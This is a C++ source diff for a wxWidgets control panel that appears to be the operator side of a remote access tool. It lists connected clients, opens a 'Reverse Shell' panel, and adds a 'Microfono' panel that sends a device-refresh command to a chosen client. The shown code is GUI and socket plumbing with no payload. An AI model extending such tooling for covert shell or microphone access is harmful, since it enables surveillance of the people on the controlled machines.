@@ -5,6 +5,25 @@
 extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
+wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
+    EVT_BUTTON(EnumIDS::ID_FrameClienteTest, FrameCliente::OnTest)
+    EVT_CLOSE(FrameCliente::OnClose)
+    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
+wxEND_EVENT_TABLE()
+
+wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
+    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
+    EVT_MENU(EnumIDS::ID_Interactuar, MyListCtrl::OnInteractuar)
+wxEND_EVENT_TABLE()
+
+wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
+    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
+wxEND_EVENT_TABLE()
+
+wxBEGIN_EVENT_TABLE(panelMicrophone, wxPanel)
+    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Refresh, panelMicrophone::OnRefrescarDispositivos)
+wxEND_EVENT_TABLE()
+
 FrameCliente::FrameCliente(std::string strID, wxString nameID)
     : wxFrame(nullptr, wxID_ANY, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, nameID)
 {
@@ -144,11 +163,11 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
     event.Skip();
 }
 
+//Al hacer doble click en uno de los modulos del panel izquierdo
 void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
     wxTreeItemId itemID = event.GetItem();
     wxString wStr = GetItemText(itemID);
 
-    std::cout<<GetItemText(itemID).ToStdString()<<"\n";
     bool isFound = false;
     for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
         if (this->p_Notebook->GetPageText(i) == wStr) {
@@ -168,8 +187,11 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         if (wStr == "Reverse Shell") {
             this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
         }
-        //this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
         
+        if (wStr == "Microfono") {
+            this->p_Notebook->AddPage(new panelMicrophone(this), wStr, true);
+        }
+
         this->p_Notebook->Thaw();
     } 
 }
@@ -285,4 +307,58 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         }
         event.Skip();
     }
+}
+
+//Microfono
+panelMicrophone::panelMicrophone(wxWindow* pParent) :
+    wxPanel(pParent, EnumIDS::ID_Panel_Microphone) {
+
+    //Otener el ID del cliente directo del padre
+    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
+    if (wxTree) {
+        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
+        if (panel_cliente) {
+            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
+            if (frame_cliente) {
+                this->strID = frame_cliente->strClienteID;
+            }
+        }
+    }
+
+    this->SetBackgroundColour(wxColor(200, 200, 200));
+
+    //wxBoxSizer* mic_sizer = new wxBoxSizer(wxHORIZONTAL);
+
+    //wxGridSizer* mic_grid = new wxGridSizer(1, 3, 2, 2);
+
+    
+
+    //wxComboBox* mic_devices = new wxComboBox(this, EnumIDS::ID_Panel_Mic_CMB_Devices, "...", wxDefaultPosition, wxSize(200, 20));
+    wxButton* mic_refresh_devices = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Refresh, "Refrescar lista");
+    //wxStaticText* lbl1 = new wxStaticText(this, wxID_ANY, "Dispositivos: ");
+
+    //mic_grid->Add(lbl1);
+    //mic_grid->Add(mic_devices);
+    //mic_grid->Add(mic_refresh_devices);
+
+    //this->SetSizer(mic_grid);
+    
+
+}
+
+void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
+    std::vector<struct Cliente> vc_copy;
+    std::unique_lock<std::mutex> lock(vector_mutex);
+    vc_copy = p_Servidor->vc_Clientes;
+    lock.unlock();
+
+    for (auto vcCli : vc_copy) {
+        if (vcCli._id == this->strID) {
+            std::string strComando = std::to_string(EnumComandos::Mic_Refre_Dispositivos);
+            strComando.append(1, '~');
+            int iEnviado = p_Servidor->cSend(vcCli._sckCliente, strComando.c_str(), strComando.size() + 1, 0, false);
+            break;
+        }
+    }
+
 }
